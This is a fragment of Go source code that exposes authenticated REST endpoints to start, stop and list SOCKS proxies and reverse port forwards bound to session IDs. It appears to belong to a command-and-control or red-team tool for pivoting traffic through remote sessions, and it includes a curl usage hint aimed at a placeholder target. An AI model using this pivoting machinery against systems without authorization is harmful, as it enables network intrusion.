	bgJobEndByKind(sid, "rportfwd", bindPort, "killed", "已停止反向转发")
	return nil
}

func orNone(s string) string {
	if s == "" {
		return "(未指定)"
	}
	return s
}

// ---------------------------------------------------------------- REST

// RegisterProxyRoutes 注册代理相关 REST 路由 (由 server.go 的 main 调用)。
//
// 全部套 requireAuth: 起/停 SOCKS 与 rportfwd 会直接在服务端开监听端口,
// 未登录不该能碰。-auth=off 时 requireAuth 内部放行, 单机调试体验不变。
func RegisterProxyRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/proxy/start", requireAuth(handleProxyStart))
	mux.HandleFunc("/api/proxy/stop", requireAuth(handleProxyStop))
	mux.HandleFunc("/api/proxy/list", requireAuth(handleProxyList))
	mux.HandleFunc("/api/proxy/rportfwd/start", requireAuth(handleRportfwdStart))
	mux.HandleFunc("/api/proxy/rportfwd/stop", requireAuth(handleRportfwdStop))
}

func handleProxyStart(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID  string `json:"sid"`
		Port int    `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	if req.Port == 0 {
		req.Port = 1080
	}
	msg, err := ProxyStart(req.SID, req.Port)
	if err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, map[string]interface{}{
		"ok": true, "sid": req.SID, "port": req.Port, "message": msg,
		"usage": fmt.Sprintf("curl --socks5-hostname 127.0.0.1:%d http://TARGET/", req.Port),
	})
}

func handleProxyStop(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID  string `json:"sid"`
		Port int    `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	if err := ProxyStop(req.SID, req.Port); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true})
}

func handleProxyList(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, proxyList())
}

func handleRportfwdStart(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID    string `json:"sid"`
		Port   int    `json:"port"`
		Target string `json:"target"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	msg, err := RPortfwdStart(req.SID, req.Port, strings.TrimSpace(req.Target))
	if err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true, "message": msg})
}

func handleRportfwdStop(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID  string `json:"sid"`
		Port int    `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	if err := RPortfwdStop(req.SID, req.Port); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true})
}

// ---------------------------------------------------------------- 状态视图

// proxyList 汇总代理入口、反向转发与计数 (GUI / 运维用)
func proxyList() map[string]interface{} {
	proxyMu.Lock()
	runs := make([]*proxyRun, 0, len(proxyRuns))
	for _, r := range proxyRuns {
		runs = append(runs, r)
	}
	revs := make([]*rportfwdRun, 0, len(rportfwdRuns))
	for _, rr := range rportfwdRuns {
		revs = append(revs, rr)
	}
	proxyMu.Unlock()

	socks := []map[string]interface{}{}
	total := 0
	for _, r := range runs {
		r.mu.Lock()
		n := len(r.chans)
		r.mu.Unlock()
		total += n
		if r.reverse {
			continue
		}
		socks = append(socks, map[string]interface{}{
			"sid":    r.sid,
			"port":   r.port,
			"listen": fmt.Sprintf("127.0.0.1:%d", r.port),
			"chans":  n,
			"tx_tlv": r.ntx,
			"rx_b":   r.nrx,
			"up_b":   r.upBytes,
		})
	}
	rr := []map[string]interface{}{}
	for _, x := range revs {
		rr = append(rr, map[string]interface{}{
			"sid": x.sid, "port": x.port, "target": orNone(x.target),
		})
	}

	return map[string]interface{}{
		"ok":         true,
		"socks":      socks,
		"rportfwd":   rr,
		"chans":      total,
		"tx_tlv":     proxyStatTx.Load(),
		"up_bytes":   proxyStatUp.Load(),
		"rx_bytes":   proxyStatRx.Load(),
		"down_bytes": proxyStatDn.Load(),
		"pump":       "running",
	}
}
